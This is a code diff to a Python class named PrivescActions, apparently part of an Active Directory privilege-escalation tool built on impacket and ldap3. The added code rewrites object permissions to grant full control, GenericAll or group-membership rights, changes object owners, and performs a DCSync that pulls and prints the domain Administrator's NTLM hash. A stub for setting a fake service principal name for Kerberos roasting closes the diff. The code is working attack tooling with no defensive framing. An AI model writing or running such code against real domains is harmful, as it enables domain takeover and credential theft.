@@ -6,6 +6,7 @@ import re
 import subprocess
 from datetime import datetime
 from pathlib import Path
+from uuid import UUID
 
 import ldap3
 from impacket.krb5 import constants
@@ -42,21 +43,33 @@ class PrivescActions:
             return None
 
         candidate = str(identity)
-        sam = candidate.split("@")[0] if "@" in candidate else candidate
-        ldap_filter = (
-            f"(|(distinguishedName={candidate})(userPrincipalName={candidate})"
-            f"(sAMAccountName={sam})(name={candidate})(cn={candidate}))"
-        )
+        sam = candidate
+        if "\\" in candidate:
+            sam = candidate.split("\\")[-1]
+        elif "@" in candidate:
+            sam = candidate.split("@")[0]
+
+        search_values = [candidate]
+        if sam not in search_values:
+            search_values.append(sam)
+        upn = f"{sam}@{self.domain}" if sam else None
+        if upn and upn not in search_values:
+            search_values.append(upn)
 
         try:
-            if self.conn.search(
-                search_base=search_base,
-                search_filter=ldap_filter,
-                search_scope=SUBTREE,
-                attributes=["distinguishedName"],
-                size_limit=1,
-            ) and self.conn.entries:
-                return str(self.conn.entries[0].entry_dn)
+            for value in search_values:
+                ldap_filter = (
+                    f"(|(distinguishedName={value})(userPrincipalName={value})"
+                    f"(sAMAccountName={value})(name={value})(cn={value}))"
+                )
+                if self.conn.search(
+                    search_base=search_base,
+                    search_filter=ldap_filter,
+                    search_scope=SUBTREE,
+                    attributes=["distinguishedName"],
+                    size_limit=1,
+                ) and self.conn.entries:
+                    return str(self.conn.entries[0].entry_dn)
         except Exception as e:
             print(f"  [!] DN LOOKUP FAILED for {identity}: {e}")
 
@@ -90,16 +103,108 @@ class PrivescActions:
         """Read nTSecurityDescriptor for an object."""
         controls = security_descriptor_control(sdflags=0x07)
         if self.conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["nTSecurityDescriptor"], controls=controls) and self.conn.entries:
-            raw = self.conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
+            entry = self.conn.entries[0]
+            raw_attr = entry["nTSecurityDescriptor"]
+            raw = None
+            if hasattr(raw_attr, "raw_values") and raw_attr.raw_values:
+                raw = raw_attr.raw_values[0]
+            if raw is None:
+                raw_values = entry.entry_raw_attributes.get("nTSecurityDescriptor") or []
+                if raw_values:
+                    raw = raw_values[0]
+            if raw is None:
+                return None
             sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
             sd.fromString(raw)
             return sd
         return None
 
-    def save_security_descriptor(self, dn, sd):
+    def save_security_descriptor(self, dn, sd, sdflags=0x04):
         """Write nTSecurityDescriptor back to an object."""
-        controls = security_descriptor_control(sdflags=0x07)
-        self.conn.modify(dn, {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [sd.getData()])]}, controls=controls)
+        controls = security_descriptor_control(sdflags=sdflags)
+        return self.conn.modify(dn, {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [sd.getData()])]}, controls=controls)
+
+    def _get_configuration_naming_context(self):
+        domain_parts = [part for part in str(self.domain).split(".") if part]
+        if not domain_parts:
+            return None
+        return "CN=Configuration," + ",".join([f"DC={part}" for part in domain_parts])
+
+    def _get_schema_idguid(self, ldap_display_name):
+        schema_base = self._get_configuration_naming_context()
+        if not schema_base:
+            return None
+
+        if ldap_display_name.lower() == "member":
+            fallback = "bf9679c0-0de6-11d0-a285-00aa003049e2"
+            return UUID(fallback).bytes_le
+
+        try:
+            if self.conn.search(
+                f"CN=Schema,{schema_base}",
+                f"(lDAPDisplayName={ldap_display_name})",
+                search_scope=SUBTREE,
+                attributes=["schemaIDGUID"],
+                size_limit=1,
+            ) and self.conn.entries:
+                values = self.conn.entries[0].entry_attributes_as_dict.get("schemaIDGUID") or []
+                if values:
+                    value = values[0]
+                    if isinstance(value, (bytes, bytearray)):
+                        return value
+                    if isinstance(value, UUID):
+                        return value.bytes_le
+                    return UUID(str(value)).bytes_le
+        except Exception as e:
+            print(f"  [!] SCHEMA GUID LOOKUP FAILED for {ldap_display_name}: {e}")
+
+        return None
+
+    def _ensure_dacl(self, sd):
+        try:
+            existing_dacl = sd["Dacl"]
+        except Exception:
+            existing_dacl = None
+
+        if not existing_dacl:
+            sd["Dacl"] = ldaptypes.ACL()
+            sd["Dacl"]["AclRevision"] = 2
+            sd["Dacl"]["Sbz1"] = 0
+            sd["Dacl"]["Sbz2"] = 0
+            sd["Dacl"]["Data"] = []
+
+        return sd["Dacl"]
+
+    def _append_ace(self, sd, ace):
+        dacl = self._ensure_dacl(sd)
+        dacl["Data"].append(ace)
+
+    def _build_access_allowed_ace(self, sid, mask_value):
+        ace = ACE()
+        ace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE
+        ace["AceFlags"] = 0x00
+        ace_data = ACCESS_ALLOWED_ACE()
+        ace_data["Mask"] = ACCESS_MASK()
+        ace_data["Mask"]["Mask"] = mask_value
+        ace_data["Sid"] = ldaptypes.LDAP_SID()
+        ace_data["Sid"].fromCanonical(sid)
+        ace["Ace"] = ace_data
+        return ace
+
+    def _build_access_allowed_object_ace(self, sid, mask_value, object_type_bytes):
+        ace = ACE()
+        ace["AceType"] = ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
+        ace["AceFlags"] = 0x00
+        ace_data = ACCESS_ALLOWED_OBJECT_ACE()
+        ace_data["Mask"] = ACCESS_MASK()
+        ace_data["Mask"]["Mask"] = mask_value
+        ace_data["Flags"] = ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
+        ace_data["ObjectType"] = object_type_bytes
+        ace_data["InheritedObjectType"] = b""
+        ace_data["Sid"] = ldaptypes.LDAP_SID()
+        ace_data["Sid"].fromCanonical(sid)
+        ace["Ace"] = ace_data
+        return ace
 
     def grant_full_control(self, dn, sid):
         """Add a full-control ACE to an object's DACL."""
@@ -107,26 +212,28 @@ class PrivescActions:
         if not sd:
             return False
 
-        ace = ACE()
-        ace['AceType'] = ACCESS_ALLOWED_ACE.ACE_TYPE
-        ace['AceFlags'] = 0x00
-        ace_data = ACCESS_ALLOWED_ACE()
-        ace_data['Mask'] = ACCESS_MASK()
-        ace_data['Mask']['Mask'] = 983551
-        ace_data['Sid'] = ldaptypes.LDAP_SID()
-        ace_data['Sid'].fromCanonical(sid)
-        ace['Ace'] = ace_data
+        ace = self._build_access_allowed_ace(sid, 983551)
+        self._append_ace(sd, ace)
+        return self.save_security_descriptor(dn, sd, sdflags=0x04)
 
-        if 'Dacl' not in sd or sd['Dacl'] == b'':
-            sd['Dacl'] = ldaptypes.ACL()
-            sd['Dacl']['AclRevision'] = 2
-            sd['Dacl']['Sbz1'] = 0
-            sd['Dacl']['Sbz2'] = 0
-            sd['Dacl']['Data'] = []
+    def grant_generic_all(self, dn, sid):
+        """Grant GenericAll semantics using a full-control ACE mask."""
+        return self.grant_full_control(dn, sid)
 
-        sd['Dacl']['Data'].append(ace)
-        self.save_security_descriptor(dn, sd)
-        return True
+    def grant_group_addmember(self, group_dn, sid):
+        """Grant write-property access on the group's member attribute."""
+        sd = self.load_security_descriptor(group_dn)
+        if not sd:
+            return False
+
+        member_guid = self._get_schema_idguid("member")
+        if not member_guid:
+            logging.error("  [!] Could not resolve schemaIDGUID for member attribute.")
+            return False
+
+        ace = self._build_access_allowed_object_ace(sid, 0x20, member_guid)
+        self._append_ace(sd, ace)
+        return self.save_security_descriptor(group_dn, sd, sdflags=0x04)
 
     def set_owner(self, dn, sid):
         """Set the owner SID on an object's security descriptor."""
@@ -134,10 +241,12 @@ class PrivescActions:
         if not sd:
             return False
 
+        if isinstance(sid, (bytes, bytearray)):
+            sid = sid.decode(errors="ignore")
+
         sd['OwnerSid'] = ldaptypes.LDAP_SID()
         sd['OwnerSid'].fromCanonical(sid)
-        self.save_security_descriptor(dn, sd)
-        return True
+        return self.save_security_descriptor(dn, sd, sdflags=0x01)
 
     def resolve_target(self, rel):
         """Resolve the most useful target endpoint for a relationship."""
@@ -225,31 +334,145 @@ class PrivescActions:
         return success
 
     def dcsync(self, current_password):
-        """Best-effort DCSync using Impacket secretsdump internals."""
-        user = self._resolve_kerberos_username()
+        """Perform DCSync as the current principal and recover Administrator's NTLM hash."""
+
+        actor = self._resolve_kerberos_username()
+        target = "Administrator"
+        remote_ops = None
+
         try:
-            smb = SMBConnection(self.dc_ip, self.dc_ip, sess_port=445)
-            smb.login(user, current_password, self.domain)
-            remote_ops = RemoteOperations(smb, False, kdcHost=self.dc_ip, ldapConnection=self.conn)
-            remote_ops.enableRegistry()
-            boot_key = remote_ops.getBootKey()
+            from impacket.examples.secretsdump import NTDSHashes
+
+            # Authenticate as the current principal
+            smb = SMBConnection(
+                self.dc_ip,
+                self.dc_ip,
+                sess_port=445
+            )
+            smb.login(
+                actor,
+                current_password,
+                self.domain
+            )
+
+            remote_ops = RemoteOperations(
+                smb,
+                False,
+                kdcHost=self.dc_ip
+            )
+            remote_ops.connectSamr(self.domain)
+
+            # Resolve Administrator SID
+            raw_sid = self.get_object_sid(target)
+
+            if not raw_sid:
+                raise Exception(
+                    f"Could not resolve SID for {target}"
+                )
+
+            sid_obj = ldaptypes.LDAP_SID()
+
+            if isinstance(raw_sid, (bytes, bytearray)):
+                sid_obj.fromString(raw_sid)
+            else:
+                sid_obj.fromCanonical(str(raw_sid))
+
+            target_sid = sid_obj.formatCanonical()
+
+            # DCSync Administrator
+            print("[*] Performing DCSync")
+
+            user_record = remote_ops.DRSGetNCChangesSid(
+                target_sid
+            )
+
+            reply_version = f"V{user_record['pdwOutVersion']}"
+            reply = user_record['pmsgOut'][reply_version]
+
+            if reply['cNumObjects'] <= 0:
+                raise Exception(
+                    "DCSync returned no objects"
+                )
+
+            print("[+] DCSync Request Successful")
+
+            prefix_table = reply['PrefixTableSrc']['pPrefixEntry']
+            recovered_hashes = []
+
+            def hash_callback(secret_type, secret):
+                if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
+                    recovered_hashes.append(str(secret))
+
+            # Use Impacket's NTDS credential parser
             ntds = NTDSHashes(
                 None,
-                boot_key,
-                isRemote=True,
+                b'',
+                isRemote=False,
                 history=False,
                 noLMHash=True,
                 remoteOps=remote_ops,
-                justNTLM=False,
+                useVSSMethod=False,
+                remoteSSMethodWMINTDS=False,
+                justNTLM=True,
+                pwdLastSet=False,
+                resumeSession=None,
+                outputFileName=None,
+                justUser=None,
+                skipUser=None,
+                ldapFilter=None,
+                printUserStatus=False,
+                localDomainSid=None,
+                perSecretCallback=hash_callback
             )
-            ntds.dump()
-            ntds.finish()
-            remote_ops.finish()
-            print("  [+] DCSYNC COMPLETE")
+
+            try:
+                ntds._NTDSHashes__decryptHash(
+                    user_record,
+                    prefix_table,
+                    None
+                )
+            finally:
+                try:
+                    ntds.finish()
+                except Exception:
+                    pass
+
+            # Find Administrator's NTLM hash
+            administrator_hash = None
+
+            for recovered in recovered_hashes:
+                parts = recovered.split(":")
+
+                if len(parts) >= 4:
+                    username = parts[0].lower()
+                    rid = parts[1]
+
+                    if username == "administrator" or rid == "500":
+                        administrator_hash = parts[3]
+                        break
+
+            if not administrator_hash:
+                raise Exception(
+                    "Administrator NTLM hash was not recovered"
+                )
+
+            print(
+                f"[+] Administrator NTLM Hash: "
+                f"{administrator_hash}"
+            )
+
             return True
+
         except Exception as e:
-            print(f"  [!] DCSYNC FAILED: {e}")
+            print(f"[!] DCSync Failed: {e}")
             return False
+
+        finally:
+            if remote_ops is not None:
+                try:
+                    remote_ops.finish()
+                except Exception:
+                    pass
 
     def set_fake_spn(self, target_dn, spn_value="viper/roasted"):
         print(f"  [*] Attempting LDAP MODIFY_ADD for servicePrincipalName...")
